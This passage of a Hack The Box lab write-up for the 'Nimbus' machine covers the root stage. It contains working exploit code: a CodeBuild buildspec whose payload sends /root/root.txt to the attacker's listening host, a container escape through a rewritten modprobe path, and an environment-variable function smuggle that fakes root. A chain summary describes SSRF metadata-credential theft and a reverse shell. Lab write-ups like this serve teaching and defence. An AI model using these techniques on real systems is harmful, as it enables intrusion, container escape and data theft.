+<li>One catch: floci’s image entrypoint tries to drop privileges by checking <code>id</code> first. We smuggle a shell function in through the <code>BASH_FUNC_id%%</code> environment variable so <code>id</code> <em>reports</em> uid 0 and the entrypoint trusts it.</li>
+</ol>
+<p>There’s a subtlety worth calling out: the build container itself can’t route to our tun0, so the exfil can’t come from inside the build. That’s fine — the payload runs on the <strong>host</strong> via the usermode helper, and the host can reach us. So the host-side script is what phones home with the flag.</p>
+<p>The buildspec:</p>
+<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="number">0.2</span></span><br><span class="line"><span class="attr">phases:</span></span><br><span class="line">  <span class="attr">build:</span></span><br><span class="line">    <span class="attr">commands:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">id</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">cat</span> <span class="string">/proc/self/status</span> <span class="string">|</span> <span class="string">grep</span> <span class="string">Cap</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">|</span></span><br><span class="line"><span class="string">        cat &gt; /tmp/payload.sh &lt;&lt; &#x27;PYEOF&#x27;</span></span><br><span class="line"><span class="string">        #!/bin/sh</span></span><br><span class="line"><span class="string">        python3 -c &quot;</span></span><br><span class="line"><span class="string">        import socket</span></span><br><span class="line"><span class="string">        s = socket.socket()</span></span><br><span class="line"><span class="string">        s.connect((&#x27;10.10.16.32&#x27;, 9005))</span></span><br><span class="line"><span class="string">        s.send(open(&#x27;/root/root.txt&#x27;,&#x27;rb&#x27;).read())</span></span><br><span class="line"><span class="string">        s.close()</span></span><br><span class="line"><span class="string">        &quot;</span></span><br><span class="line"><span class="string">        PYEOF</span></span><br><span class="line"><span class="string"></span>      <span class="bullet">-</span> <span class="string">chmod</span> <span class="string">+x</span> <span class="string">/tmp/payload.sh</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">|</span></span><br><span class="line"><span class="string">        upper=$(awk &#x27;/overlay/&#123;match($0,/upperdir=([^,]+)/,a);if(a[1])print a[1]&#125;&#x27; /proc/mounts | head -1)</span></span><br><span class="line"><span class="string">        echo &quot;$upper/tmp/payload.sh&quot; &gt; /proc/sys/kernel/modprobe</span></span><br><span class="line"><span class="string"></span>      <span class="bullet">-</span> <span class="string">printf</span> <span class="string">&#x27;\xff\xff\xff\xff&#x27;</span> <span class="string">&gt;</span> <span class="string">/tmp/x</span> <span class="string">&amp;&amp;</span> <span class="string">chmod</span> <span class="string">+x</span> <span class="string">/tmp/x</span> <span class="string">&amp;&amp;</span> <span class="string">/tmp/x;</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure></div>
+
+<p>The <code>upperdir</code> line is the clever bit — it reads where the container’s overlay filesystem actually lives on the host, and rewrites the modprobe path so it points at <code>payload.sh</code> as the <strong>host</strong> sees it, not as the container sees it.</p>
+<p>The driver, run from the worker (note the <code>floci:4566</code> endpoint and the <code>BASH_FUNC_id%%</code> smuggle):</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> boto3</span><br><span class="line">cb = boto3.client(<span class="string">&quot;codebuild&quot;</span>, endpoint_url=<span class="string">&quot;http://floci:4566&quot;</span>, region_name=<span class="string">&quot;us-east-1&quot;</span>)</span><br><span class="line"></span><br><span class="line">cb.create_project(</span><br><span class="line">    name=<span class="string">&quot;nimbus-exploit&quot;</span>,</span><br><span class="line">    source=&#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;NO_SOURCE&quot;</span>, <span class="string">&quot;buildspec&quot;</span>: BUILDSPEC&#125;,</span><br><span class="line">    artifacts=&#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;NO_ARTIFACTS&quot;</span>&#125;,</span><br><span class="line">    environment=&#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;LINUX_CONTAINER&quot;</span>,</span><br><span class="line">        <span class="string">&quot;image&quot;</span>: <span class="string">&quot;floci/floci:latest&quot;</span>,</span><br><span class="line">        <span class="string">&quot;computeType&quot;</span>: <span class="string">&quot;BUILD_GENERAL1_SMALL&quot;</span>,</span><br><span class="line">        <span class="string">&quot;privilegedMode&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="string">&quot;environmentVariables&quot;</span>: [</span><br><span class="line">            &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;BASH_FUNC_id%%&quot;</span>,</span><br><span class="line">             <span class="string">&quot;value&quot;</span>: <span class="string">&#x27;() &#123; echo &quot;uid=0(root) gid=0(root) groups=0(root)&quot;; &#125;&#x27;</span>,</span><br><span class="line">             <span class="string">&quot;type&quot;</span>: <span class="string">&quot;PLAINTEXT&quot;</span>&#125;</span><br><span class="line">        ],</span><br><span class="line">    &#125;,</span><br><span class="line">    serviceRole=<span class="string">&quot;arn:aws:iam::000000000000:role/codebuild-role&quot;</span>,</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;started:&quot;</span>, cb.start_build(projectName=<span class="string">&quot;nimbus-exploit&quot;</span>)[<span class="string">&quot;build&quot;</span>][<span class="string">&quot;id&quot;</span>])</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">started: nimbus-exploit:1</span><br></pre></td></tr></table></figure></div>
+
+<p>Meanwhile, our listener on <code>9005</code>:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9005</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Listening on 0.0.0.0 9005</span><br><span class="line">Connection received on 10.129.33.240 43636</span><br><span class="line">a05f85ddcdfe9d4e85a5301c9cda6ea1</span><br></pre></td></tr></table></figure></div>
+
+<p>The privileged build container came up, wrote our payload into a host-visible path, repointed <code>/proc/sys/kernel/modprobe</code> at it, and the unknown-magic execve made the kernel fire the usermode helper — running our script as <strong>host root</strong>, which read <code>/root/root.txt</code> off the real host and handed it over. We have <code>root.txt</code>.</p>
+<h2 id="The-Chain-Start-to-Finish"><a href="#The-Chain-Start-to-Finish" class="headerlink" title="The Chain, Start to Finish"></a>The Chain, Start to Finish</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SSRF on /jobs/preview</span><br><span class="line">  └─ octal-encoded IP defeats the metadata blocklist</span><br><span class="line">       └─ steal nimbus-web-role STS creds from IMDS</span><br><span class="line">            └─ role can only sqs:list_queues → reveals queue on internal host &quot;floci:4566&quot;</span><br><span class="line">                 └─ decimal-IP SSRF sweep finds LocalStack at 172.18.0.2:4566</span><br><span class="line">                      └─ internal S3 (no IAM) → read worker.py</span><br><span class="line">                           └─ worker yaml.load()s jobs and runs the &#x27;script&#x27; via python3 -c</span><br><span class="line">                                └─ SendMessage a reverse shell  →  user.txt  (uid=1000 worker)</span><br><span class="line">                                     └─ inside worker: floci:4566 CodeBuild answers junk creds (ENFORCE_IAM=false)</span><br><span class="line">                                          └─ privilegedMode:true project + BASH_FUNC_id%% entrypoint bypass</span><br><span class="line">                                               └─ writable /proc/sys/kernel/modprobe → usermode-helper as HOST root</span><br><span class="line">                                                    └─ root.txt</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Key-Takeaways"><a href="#Key-Takeaways" class="headerlink" title="Key Takeaways"></a>Key Takeaways</h2><ul>
+<li><strong>IP allow&#x2F;deny lists that match on the string are not a control.</strong> Octal, decimal, and other IPv4 encodings walked straight past the “metadata endpoints are blocked” filter. If you must protect IMDS, enforce IMDSv2 and block at the network layer — don’t regex the URL.</li>
+<li><strong>A trust boundary follows the data, not the service.</strong> The web tier validated with <code>safe_load</code> and bragged about it; the worker on the other side of the queue used the unsafe loader <em>and</em> <code>python3 -c</code> on a user field. Validating at one hop means nothing if the next hop trusts the same data blindly.</li>
+<li><strong>Two endpoints, two IAM postures, one privesc.</strong> The public LocalStack proxy enforced IAM; the internal <code>floci:4566</code> had <code>ENFORCE_IAM=false</code> and accepted junk credentials. Once you have code execution on the inside, that internal endpoint is an open door to every service it runs — here, CodeBuild.</li>
+<li><strong><code>privilegedMode: true</code> is root on the host.</strong> Shared kernel plus a writable <code>/proc/sys/kernel/modprobe</code> plus the usermode-helper trigger is a clean, reliable container escape, and <code>BASH_FUNC_*</code> smuggling neuters entrypoints that “drop privileges” by trusting <code>id</code>.</li>
+</ul>
+<p>That was it for Nimbus, hope you learned something new!</p>
+<p>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Nimbus</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2026-11-18 19:42:10</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-11-19 19:59:38
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2026/11/18/Hackthebox-Nimbus/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/Linux-PE/">#Linux-PE</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/SSRF/">#SSRF</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/AWS/">#AWS</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/IMDS/">#IMDS</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/LocalStack/">#LocalStack</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/SQS/">#SQS</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/CodeBuild/">#CodeBuild</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Container-Escape/">#Container-Escape</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2026/11/07/Hackthebox-Garfield/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Garfield</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Nimbus</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-Application-Nimbus-Job-Scheduler"><span class="nav-text">Web Application - Nimbus Job Scheduler </span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF-%E2%86%92-Instance-Metadata"><span class="nav-text">SSRF → Instance Metadata</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumerating-the-Role"><span class="nav-text">Enumerating the Role</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reaching-Internal-LocalStack-SSRF-round-two"><span class="nav-text">Reaching Internal LocalStack (SSRF, round two)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Foothold-%E2%86%92-user-txt"><span class="nav-text">Foothold → user.txt</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumerating-from-Inside-the-Worker"><span class="nav-text">Enumerating from Inside the Worker</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation-%E2%86%92-root-txt"><span class="nav-text">Privilege Escalation → root.txt</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#The-Chain-Start-to-Finish"><span class="nav-text">The Chain, Start to Finish</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Key-Takeaways"><span class="nav-text">Key Takeaways</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
